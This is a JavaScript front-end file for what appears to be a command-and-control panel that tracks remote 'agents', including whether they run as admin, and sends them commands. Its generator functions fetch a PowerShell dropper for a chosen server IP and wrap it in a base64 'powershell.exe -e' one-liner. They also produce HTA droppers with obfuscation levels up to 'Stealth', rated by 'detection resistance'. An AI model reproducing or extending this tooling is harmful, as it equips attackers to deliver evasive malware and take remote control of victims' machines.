const CONFIG = {
    UPDATE_INTERVAL: 2000,
    AGENT_OFFLINE_TIMEOUT: 60,
    MAX_EVENT_LOG_ENTRIES: 30,
    MAX_NETWORK_AGENTS: 20,
    NETWORK: {
        MIN_SCALE: 0.3,
        MAX_SCALE: 3,
        DEFAULT_SCALE: 1,
        ZOOM_FACTOR: 1.2,
        NODE_RADIUS_FACTOR: 0.7
    },
    API: {
        DATA: '/api/data',
        COMMAND: '/command',
        HTA_DROPPER: '/hta-dropper',
        DELETE_AGENT: '/api/agent'
    }
};

document.head.insertAdjacentHTML('beforeend', `
<style>
    .console-container {
        background-color: #000;
        position: relative;
        display: flex;
        flex-direction: column;
    }
    
    #console-output {
        flex: 1;
        overflow-y: auto;
        padding-bottom: 40px; /* Espaço para o input */
    }
    
    .console-input-line {
        position: sticky;
        position: -webkit-sticky;
        bottom: 0;
        left: 0;
        right: 0;
        background-color: #000;
        border-top: 1px solid #333;
        padding-top: 6px;
        padding-bottom: 8px;
        z-index: 10;
    }
    
    .console-input-line input {
        background-color: transparent;
        color: #4ade80;
        caret-color: #4ade80;
        width: 100%;
    }
    
    .console-input-line input::placeholder {
        color: rgba(74, 222, 128, 0.5);
    }
    
    .console-input-line input:focus {
        outline: none;
        box-shadow: none;
    }
</style>
`);

let currentAgents = {};
let currentView = 'table';

function formatTime(timestamp) {
    if (!timestamp) return 'N/A';
    const date = new Date(timestamp);
    return date.toLocaleString('en-US', { 
        day: '2-digit',
        month: '2-digit',
        year: 'numeric',
        hour: '2-digit', 
        minute: '2-digit', 
        second: '2-digit' 
    });
}

function isAgentOnline(lastSeen) {
    if (!lastSeen) return false;
    const lastSeenDate = new Date(lastSeen);
    const now = new Date();
    const diffSeconds = (now - lastSeenDate) / 1000;
    return diffSeconds < CONFIG.AGENT_OFFLINE_TIMEOUT;
}

function isAgentAdmin(admin) {
    return admin === 'y';
}

function debounce(func, wait) {
    let timeout;
    return function executedFunction(...args) {
        const later = () => {
            clearTimeout(timeout);
            func(...args);
        };
        clearTimeout(timeout);
        timeout = setTimeout(later, wait);
    };
}

function clamp(value, min, max) {
    return Math.min(Math.max(value, min), max);
}

function updateEventLog(events) {
    const container = document.getElementById('eventLog');
    container.innerHTML = '';
    
    if (events.length === 0) {
        container.innerHTML = '<div class="text-gray-400 text-center py-4">No events recorded</div>';
        return;
    }

    events.slice(-CONFIG.MAX_EVENT_LOG_ENTRIES).forEach(event => {
        const div = document.createElement('div');
        div.className = 'text-green-400 text-xs mb-2 p-2 bg-gray-900 bg-opacity-50 rounded border-l-2 border-green-500 leading-relaxed';
        div.textContent = event;
        container.appendChild(div);
    });
    
    container.scrollTop = container.scrollHeight;
}

function openAgentGenerator() {
    const modal = document.getElementById('agentGeneratorModal');
    modal.classList.remove('hidden');
    modal.classList.add('flex');
    
    document.getElementById('serverIP').value = '';
    document.getElementById('generatedCode').textContent = 'Enter the server IP/Host and click "Generate Dropper" to get the PowerShell code';
    
    const onelinerBtn = document.getElementById('generateOnelinerBtn');
    const htaBtn = document.getElementById('generateHTABtn');
    const obfLevelSection = document.getElementById('obfuscationLevelSection');
    
    if (onelinerBtn) {
        onelinerBtn.style.display = 'none';
    }
    if (htaBtn) {
        htaBtn.style.display = 'none';
    }
    if (obfLevelSection) {
        obfLevelSection.style.display = 'none';
    }
    
    initializeObfuscationSlider();
}

function closeAgentGenerator() {
    const modal = document.getElementById('agentGeneratorModal');
    modal.classList.add('hidden');
    modal.classList.remove('flex');
}

async function generateDropper() {
    const serverIP = document.getElementById('serverIP').value.trim();
    const generateBtn = document.getElementById('generateDropperBtn');
    const codeOutput = document.getElementById('generatedCode');
    const onelinerBtn = document.getElementById('generateOnelinerBtn');
    const htaBtn = document.getElementById('generateHTABtn');
    
    if (!serverIP) {
        alert('Please enter the server IP/Host');
        return;
    }
    
    const originalText = generateBtn.innerHTML;
    generateBtn.disabled = false;
    
    codeOutput.textContent = '# Connecting to server to generate dropper...';
    onelinerBtn.style.display = 'none';
    htaBtn.style.display = 'none';
    
    try {
        const response = await fetch(`/dropper/${serverIP}`);
        
        if (response.status === 401) {
            throw new Error('Not authorized - Please login again');
        }
        
        if (response.status === 400) {
            const errorText = await response.text();
            throw new Error(errorText || 'Invalid IP/Host');
        }
        
        if (!response.ok) {
            throw new Error(`Server error: HTTP ${response.status}`);
        }
        
        const dropperCode = await response.text();
        
        codeOutput.textContent = dropperCode;
        
        onelinerBtn.style.display = 'block';
        
        showDropperSuccess(serverIP);
        
    } catch (error) {
        codeOutput.textContent = `# Error generating dropper: ${error.message}
# 
# Please check:
# - The IP/Host is correct
# - You are authenticated in the system
# - The server is online
# - There are no connectivity issues`;
        
        alert(`Error: ${error.message}`);
    } finally {
        generateBtn.innerHTML = originalText;
        generateBtn.disabled = false;
    }
}

function generateOneliner() {
    const code = document.getElementById('generatedCode').textContent;
    const onelinerOutput = document.getElementById('onelinerCode');
    const onelinerBtn = document.getElementById('generateOnelinerBtn');
    const htaBtn = document.getElementById('generateHTABtn');
    const obfLevelSection = document.getElementById('obfuscationLevelSection');
    
    if (!code || code.startsWith('#')) {
        alert('First generate the PowerShell dropper');
        return;
    }
    
    try {
        const originalText = onelinerBtn.innerHTML;
        onelinerBtn.disabled = false;
        
        let utf16leBytes = [];
        for (let i = 0; i < code.length; i++) {
            const charCode = code.charCodeAt(i);
            utf16leBytes.push(charCode & 0xFF);
            utf16leBytes.push((charCode >> 8) & 0xFF);
        }
        
        let binaryString = '';
        for (let i = 0; i < utf16leBytes.length; i++) {
            binaryString += String.fromCharCode(utf16leBytes[i]);
        }
        const base64 = btoa(binaryString);
        
        const oneliner = `powershell.exe -e ${base64}`;
        
        onelinerOutput.textContent = oneliner;
        onelinerOutput.style.display = 'block';
        
        document.getElementById('onelinerSection').style.display = 'block';
        
        htaBtn.style.display = 'block';
        if (obfLevelSection) {
            obfLevelSection.style.display = 'block';
        }
        
        showOnelinerSuccess();
        
    } catch (error) {
        alert(`Error generating oneliner: ${error.message}`);
        
        onelinerOutput.textContent = `# Error generating oneliner: ${error.message}`;
        onelinerOutput.style.display = 'block';
    } finally {
        onelinerBtn.innerHTML = originalText;
        onelinerBtn.disabled = false;
    }
}

async function generateHTADropper() {
    const onelinerCode = document.getElementById('onelinerCode').textContent;
    const htaBtn = document.getElementById('generateHTABtn');
    const obfuscationLevel = document.getElementById('obfuscationLevel').value;
    
    if (!onelinerCode || onelinerCode.startsWith('#')) {
        alert('First generate the oneliner command');
        return;
    }
    
    try {
        const originalText = htaBtn.innerHTML;
        
        const response = await fetch(CONFIG.API.HTA_DROPPER, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                oneliner: onelinerCode.trim(),
                obfuscation_level: parseInt(obfuscationLevel)
            })
        });
        
        if (response.status === 401) {
            throw new Error('Not authorized - Please login again');
        }
        
        if (!response.ok) {
            const errorData = await response.json();
            throw new Error(errorData.error || `Server error: HTTP ${response.status}`);
        }
        
        const contentType = response.headers.get('content-type');
        if (contentType && contentType.includes('application/json')) {
            const errorData = await response.json();
            throw new Error(errorData.error || 'Unknown error');
        }
        
        const blob = await response.blob();
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.style.display = 'none';
        a.href = url;
        a.download = `dropper_L${obfuscationLevel}.hta`;
        document.body.appendChild(a);
        a.click();
        window.URL.revokeObjectURL(url);
        document.body.removeChild(a);
        
        showHTASuccess(obfuscationLevel);
        
    } catch (error) {
        alert(`Error generating HTA dropper: ${error.message}`);
        console.error('HTA Generation Error:', error);
    } finally {
        htaBtn.innerHTML = originalText;
        htaBtn.disabled = false;
    }
}

function initializeObfuscationSlider() {
    const slider = document.getElementById('obfuscationLevel');
    const valueDisplay = document.getElementById('obfuscationLevelValue');
    const descDisplay = document.getElementById('obfuscationLevelDesc');
    
    const descriptions = {
        1: 'Basic', 2: 'Basic+', 3: 'Intermediate', 4: 'Intermediate+',
        5: 'Advanced', 6: 'Advanced+', 7: 'Expert', 8: 'Expert+',
        9: 'Maximum', 10: 'Stealth'
    };
    
    const resistanceColors = {
        1: 'text-red-400', 2: 'text-red-400', 3: 'text-yellow-400', 4: 'text-yellow-400',
        5: 'text-blue-400', 6: 'text-blue-400', 7: 'text-purple-400', 8: 'text-purple-400',
        9: 'text-green-400', 10: 'text-green-400'
    };
    
    function updateDisplay(value) {
        valueDisplay.textContent = value;
        descDisplay.textContent = descriptions[value] || 'Unknown';
        Object.values(resistanceColors).forEach(color => {
            valueDisplay.classList.remove(color);
        });
        valueDisplay.classList.add(resistanceColors[value] || 'text-white');
    }
    
    if (slider) {
        slider.addEventListener('input', function() { updateDisplay(this.value); });
        updateDisplay(slider.value);
    }
}

function showDropperSuccess(serverIP) {
    const notification = document.createElement('div');
    notification.className = 'fixed top-4 right-4 z-50 bg-green-900 border border-green-500 text-green-300 px-4 py-3 rounded-lg text-sm shadow-lg transform transition-all duration-300 translate-x-full';
    notification.innerHTML = `
        <div class="flex items-center gap-2">
            <svg class="w-5 h-5 text-green-400" fill="currentColor" viewBox="0 0 20 20">
                <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>
            </svg>
            <div>
                <div class="font-bold">Dropper Generated</div>
                <div class="text-xs opacity-75">Server: ${serverIP}</div>
            </div>
        </div>
    `;
    
    document.body.appendChild(notification);
    
    setTimeout(() => {
        notification.classList.remove('translate-x-full');
    }, 100);
    
    setTimeout(() => {
        notification.classList.add('translate-x-full');
        setTimeout(() => notification.remove(), 300);
    }, 4000);
}

function showOnelinerSuccess() {
    const notification = document.createElement('div');
    notification.className = 'fixed top-16 right-4 z-50 bg-blue-900 border border-blue-500 text-blue-300 px-4 py-3 rounded-lg text-sm shadow-lg transform transition-all duration-300 translate-x-full';
    notification.innerHTML = `
        <div class="flex items-center gap-2">
            <svg class="w-5 h-5 text-blue-400" fill="currentColor" viewBox="0 0 20 20">
                <path d="M12.316 3.051a1 1 0 01.633 1.265l-4 12a1 1 0 11-1.898-.632l4-12a1 1 0 011.265-.633zM5.707 6.293a1 1 0 010 1.414L3.414 10l2.293 2.293a1 1 0 11-1.414 1.414l-3-3a1 1 0 010-1.414l3-3a1 1 0 011.414 0zm8.586 0a1 1 0 011.414 0l3 3a1 1 0 010 1.414l-3 3a1 1 0 11-1.414-1.414L16.586 10l-2.293-2.293a1 1 0 010-1.414z"/>
            </svg>
            <div>
                <div class="font-bold">Oneliner Ready</div>
                <div class="text-xs opacity-75">BASE64 command generated</div>
            </div>
        </div>
    `;
    
    document.body.appendChild(notification);
    
    setTimeout(() => {
        notification.classList.remove('translate-x-full');
    }, 100);
    
    setTimeout(() => {
        notification.classList.add('translate-x-full');
        setTimeout(() => notification.remove(), 300);
    }, 3000);
}

function showHTASuccess(obfuscationLevel = 5) {
    const htaInfoSection = document.getElementById('htaInfoSection');
    if (htaInfoSection) {
        htaInfoSection.style.display = 'block';
        
        const levelDesc = {
            1: 'Basic', 2: 'Basic+', 3: 'Intermediate', 4: 'Intermediate+',
            5: 'Advanced', 6: 'Advanced+', 7: 'Expert', 8: 'Expert+',
            9: 'Maximum', 10: 'Stealth'
        };
        
        const resistance = obfuscationLevel <= 3 ? 'Low' : 
                          obfuscationLevel <= 6 ? 'Medium' : 
                          obfuscationLevel <= 8 ? 'High' : 'Maximum';
        
        const infoContent = htaInfoSection.querySelector('p');
        if (infoContent) {
            infoContent.textContent = `HTA dropper generated with Level ${obfuscationLevel} (${levelDesc[obfuscationLevel]}) obfuscation techniques. Detection resistance: ${resistance}.`;
        }
    }
    
    const notification = document.createElement('div');
    notification.className = 'fixed top-28 right-4 z-50 bg-purple-900 border border-purple-500 text-purple-300 px-4 py-3 rounded-lg text-sm shadow-lg transform transition-all duration-300 translate-x-full';
    notification.innerHTML = `
        <div class="flex items-center gap-2">
            <svg class="w-5 h-5 text-purple-400" fill="currentColor" viewBox="0 0 20 20">
                <path fill-rule="evenodd" d="M3 17a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zm3.293-7.707a1 1 0 011.414 0L9 10.586V3a1 1 0 112 0v7.586l1.293-1.293a1 1 0 111.414 1.414l-3 3a1 1 0 01-1.414 0l-3-3a1 1 0 010-1.414z" clip-rule="evenodd"/>
            </svg>
            <div>
                <div class="font-bold">HTA L${obfuscationLevel} Downloaded</div>
                <div class="text-xs opacity-75">Obfuscated dropper ready</div>
            </div>
        </div>
    `;
    
    document.body.appendChild(notification);
    
    setTimeout(() => {
        notification.classList.remove('translate-x-full');
    }, 100);
    
    setTimeout(() => {
        notification.classList.add('translate-x-full');
        setTimeout(() => notification.remove(), 300);
    }, 4000);
}